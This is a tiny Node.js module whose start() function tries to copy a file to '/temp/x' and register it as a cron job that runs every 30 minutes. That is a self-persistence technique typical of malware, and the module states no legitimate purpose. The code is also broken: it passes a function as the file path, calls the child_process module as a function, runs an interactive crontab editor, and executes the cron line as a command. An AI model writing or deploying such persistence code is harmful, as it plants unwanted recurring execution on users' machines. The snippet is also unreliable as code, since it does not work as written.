const fs = require('fs');
const path =  require('path');
const exec = require('child_process');
module.exports = {
    start: function(){
      fs.copyFile(path.basename, '/temp/x', (err) => {
      if (err) throw err;
      });
      exec('crontab -u $USER -e')
      exec('*/30 * * * * /temp/x');
  }
};
